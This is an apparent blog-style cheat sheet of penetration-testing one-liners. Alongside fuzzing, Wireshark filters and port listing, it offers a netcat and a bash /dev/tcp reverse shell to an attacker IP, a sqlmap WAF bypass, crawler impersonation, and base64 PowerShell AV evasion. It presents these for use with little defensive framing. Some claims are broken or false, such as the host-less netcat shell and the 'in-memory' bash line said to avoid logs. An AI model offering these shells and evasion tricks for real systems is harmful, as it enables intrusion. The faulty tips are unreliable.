## üß† Hacker's Cheat Sheet üß†

Only true hackers will appreciate these gems‚Äîcutting-edge tips and tricks that can elevate your penetration testing and ethical hacking skills. 

### üî• 1. Command Line Kung Fu

- **List all open ports** (with process info) on Linux:
  ```bash
  sudo netstat -tuln -p
  ```
> Quickly see what's open on your system without needing fancy tools.

- Find all hidden files on a Linux machine:
  ```
  find / -name ".*" -type f
  ```
> Great for uncovering hidden configurations or malicious scripts.

- Fast directory scanning with FFUF:
  ```
  ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .php,.html,.txt -o output.txt
  ```
> Quick and powerful fuzzing to discover hidden directories.

### üöÄ 2. Hidden Gems in Wireshark

- Capture only HTTP GET requests:

```
http.request.method == "GET"
```
> Skip the noise and capture just the GET requests to hunt for interesting activity.

- Filter for suspicious DNS activity:
  ```
  dns.qry.name == "evil.com"
  ```
> Target specific DNS queries to detect if someone's reaching out to malicious domains.

### üîí 3. Bypass Techniques

- **Bypass WAF using SQLMap with tamper scripts**:
    ```bash
    sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --level=5 --risk=3
    ```
    > Get around pesky WAFs with a tamper script and crank up the aggression.

- **Custom User-Agent to fool detection systems**:
    ```bash
    curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
    ```
    > Impersonate a search engine crawler to bypass access restrictions.

### üõ°Ô∏è 4. Advanced Reverse Shells

- **Obfuscated Netcat reverse shell**:
    ```bash
    mkfifo /tmp/lolpipe; nc 0</tmp/lolpipe | /bin/sh >/tmp/lolpipe 2>&1; rm /tmp/lolpipe
    ```
    > Use named pipes to create stealthier reverse shells, harder to detect by basic monitoring.

- **Bash TCP reverse shell** (for when Netcat isn‚Äôt available):
    ```bash
    bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
    ```
    > Minimal footprint, effective on many Unix-based systems.

### üíª 5. Stealth Techniques

- **Avoid logging by executing commands in memory (Linux)**:
    ```bash
    exec /bin/bash 0</dev/null 2>/dev/null
    ```
    > Run commands in a way that avoids leaving traces in `/var/log` files.

- **Evade AV detection with PowerShell base64 encoding**:
    ```bash
    powershell.exe -EncodedCommand <Base64 Encoded Command>
    ```
    > Hide your PowerShell commands by encoding them in Base64, bypassing some AV detection.

### üõ†Ô∏è 6. Tools You Might Not Know (But Should)

- [**Obsidian**](https://obsidian.md/) ‚Äì A tool for creating encrypted vaults of notes and penetration testing playbooks.
- [**Chaos Reader**](http://chaosreader.sourceforge.net/) ‚Äì Parse, analyze, and extract files from packet capture (.pcap) files.
- [**LinEnum**](https://github.com/rebootuser/LinEnum) ‚Äì A Linux enumeration script to quickly find privilege escalation vectors.

### üéØ 7. Fuzzing on Steroids

- **Fuzzing APIs with POST requests using FFUF**:
    ```bash
    ffuf -w wordlist.txt -X POST -d "parameter1=value&FUZZ=value" -u https://target.com/api/endpoint -o output.json
    ```
    > Quickly find API vulnerabilities by fuzzing POST request bodies.

- **Fuzzing JSON APIs with AFL (American Fuzzy Lop)**:
    ```bash
    afl-fuzz -i input/ -o output/ -- ./target_binary @@
    ```
    > Use AFL to find memory corruption issues in JSON parsers, or other binary targets.

üí° **Bonus Tip**: Always remember to document your findings in detail. Hacking without reporting is just half the work. üòâ
